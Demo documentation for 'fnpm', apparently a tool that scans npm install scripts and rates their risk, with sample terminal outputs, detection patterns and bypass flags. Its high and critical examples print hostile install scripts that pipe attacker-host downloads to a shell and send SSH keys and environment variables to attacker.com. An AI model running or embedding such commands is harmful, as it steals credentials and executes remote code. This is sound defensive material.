# FNPM Security Audit - Demo Examples

## Example 1: Safe Package (No Scripts)

```bash
$ fnpm add is-number@7.0.0

🔐 Security check for: is-number@7.0.0
🔍 Auditing package security...
   Installing is-number@7.0.0 in sandbox...

═══════════════════════════════════════════
📦 Package: is-number@7.0.0
🛡️  Risk Level: ✓ SAFE
═══════════════════════════════════════════

✓ No install scripts found - SAFE

✅ Security audit passed - proceeding with installation
```

## Example 2: Low Risk Package (Legitimate Build Scripts)

Many popular packages have install scripts for legitimate reasons (compiling native modules, downloading assets, etc.)

```bash
$ fnpm add node-sass

🔐 Security check for: node-sass
🔍 Auditing package security...
   Installing node-sass in sandbox...

═══════════════════════════════════════════
📦 Package: node-sass
🛡️  Risk Level: ⚠ LOW
═══════════════════════════════════════════

📜 Install Scripts:
  postinstall: node scripts/build.js

═══════════════════════════════════════════

? This package has install scripts. Continue? (Y/n)
```

## Example 3: Medium Risk (Network Activity)

```bash
$ fnpm add suspicious-downloader

🔐 Security check for: suspicious-downloader
🔍 Auditing package security...
   Installing suspicious-downloader in sandbox...

═══════════════════════════════════════════
📦 Package: suspicious-downloader
🛡️  Risk Level: ⚠ MEDIUM
═══════════════════════════════════════════

📜 Install Scripts:
  postinstall: curl https://cdn.example.com/assets.tar.gz | tar -xz

⚠️  Suspicious Patterns Detected:
  • curl: Downloads files from internet

═══════════════════════════════════════════

? This package has SUSPICIOUS patterns. Are you sure? (y/N)
```

## Example 4: High Risk (Multiple Red Flags)

```bash
$ fnpm add malicious-package

🔐 Security check for: malicious-package
🔍 Auditing package security...
   Installing malicious-package in sandbox...

═══════════════════════════════════════════
📦 Package: malicious-package
🛡️  Risk Level: ⚠ HIGH
═══════════════════════════════════════════

📜 Install Scripts:
  preinstall: node scripts/collect-env.js
  postinstall: curl http://attacker.com/report | sh

⚠️  Suspicious Patterns Detected:
  • curl: Downloads files from internet
  • process.env: Accesses environment variables
  • sh: Executes system commands

═══════════════════════════════════════════

? This package has HIGH RISK patterns. Really continue? (y/N)
```

## Example 5: Critical Risk (Obvious Malware)

```bash
$ fnpm add sha1-hulud

🔐 Security check for: sha1-hulud
🔍 Auditing package security...
   Installing sha1-hulud in sandbox...

═══════════════════════════════════════════
📦 Package: sha1-hulud
🛡️  Risk Level: ☠ CRITICAL
═══════════════════════════════════════════

📜 Install Scripts:
  preinstall: curl http://evil.com/steal.sh | bash
  postinstall: eval $(cat ~/.ssh/id_rsa | base64) && env | curl -X POST http://attacker.com

⚠️  Suspicious Patterns Detected:
  • curl: Downloads files from internet
  • bash: Executes arbitrary shell commands
  • eval: Executes arbitrary code
  • ~/.ssh: Accesses SSH keys
  • base64: Obfuscated code
  • env: Accesses environment variables
  • XMLHttpRequest: Network requests

═══════════════════════════════════════════

⚠️  CRITICAL RISK DETECTED! Continue anyway? (y/N) ▏
```

## Bypassing Security (Not Recommended)

### Skip Single Package Audit

```bash
# If you absolutely trust the package
fnpm add trusted-corporate-package --no-audit
```

### Disable Globally

Edit `.fnpm/config.json`:

```json
{
  "package_manager": "npm",
  "security_audit": false
}
```

## Real-World Example: node-gyp

Many native Node.js modules use `node-gyp` for compilation:

```bash
$ fnpm add bcrypt

🔐 Security check for: bcrypt
🔍 Auditing package security...
   Installing bcrypt in sandbox...

═══════════════════════════════════════════
📦 Package: bcrypt
🛡️  Risk Level: ⚠ LOW
═══════════════════════════════════════════

📜 Install Scripts:
  install: node-pre-gyp install --fallback-to-build

═══════════════════════════════════════════

? This package has install scripts. Continue? (Y/n) y

✅ Security audit passed - proceeding with installation

# This is SAFE - bcrypt is a popular, trusted package
# The script compiles native crypto code
```

## Tips for Decision Making

### ✅ Generally Safe Patterns

- `node-pre-gyp install`
- `node scripts/build.js`
- `tsc` (TypeScript compiler)
- `webpack` or `rollup`
- `prebuild-install`

### ⚠️ Requires Investigation

- Downloading from CDNs
- Accessing environment variables
- Running shell scripts
- Network requests

### 🚫 Almost Always Malicious

- `curl | bash` or `wget | sh`
- Accessing `~/.ssh`, `~/.aws`
- Base64 obfuscation in install scripts
- POSTing data to external servers
- Reading environment and sending it elsewhere

## Performance Impact

The security audit adds approximately **2-5 seconds** to each `fnpm add` command:

- 1-2s: Download package to /tmp
- 1-2s: Extract and analyze package.json
- 1s: Pattern matching and risk calculation

This is a small price to pay for protection against supply chain attacks!

## Coverage

The security scanner analyzes:

✅ **npm packages** - Full coverage
✅ **Scoped packages** (@org/package) - Full coverage
✅ **Version ranges** (^1.0.0, ~2.0.0) - Full coverage
✅ **Git URLs** - Partial (downloads and analyzes)
✅ **Local paths** - Skip (trusted)
❌ **Tarball URLs** - Not yet supported

## Limitations

- **Cannot detect**: Malicious code that doesn't run during install
- **Cannot detect**: Time-bombs (code that activates later)
- **Cannot detect**: Obfuscated runtime code
- **Cannot prevent**: Vulnerabilities in package dependencies

**Recommendation**: Use fnpm security + npm audit + manual code review for critical packages
